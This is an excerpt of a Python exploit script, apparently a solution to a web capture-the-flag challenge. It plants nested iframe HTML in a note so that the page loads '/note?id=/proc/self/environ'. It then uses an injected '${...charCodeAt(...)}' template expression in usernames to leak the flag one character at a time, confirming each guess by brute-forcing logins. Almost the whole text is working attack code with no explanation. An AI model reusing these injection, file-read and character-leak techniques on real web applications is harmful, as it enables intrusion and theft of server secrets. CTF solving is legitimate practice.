...
NONCE = "gogomowmi_3"  # can be at most 15, originally `nonce`
USERNAME = "qwe85"
...
def index_to_username(index):
    return (
        f"{index}_{NONCE}_"
        + "${top.a.b.note.children[3].textContent.charCodeAt("
        + f"{index}"
        + ")}"
    )
...
def register_index_nonce_ascii_at(index):
    ...
    root_id = create_note(
        ...
        "<iframe name=\"a\" srcdoc=\"<iframe name='b' src='/note?id=/proc/self/environ'></iframe><iframe name='c' src='/login'></iframe>"
        + note_id_to_iframe(note_1_id)
        + '"></iframe>',
    )
...
def check_flag_at(index):
    for i in string.printable:
        if login(f"{index}_{NONCE}_{ord(i)}", f"nnnnn"):
            return i
    return None
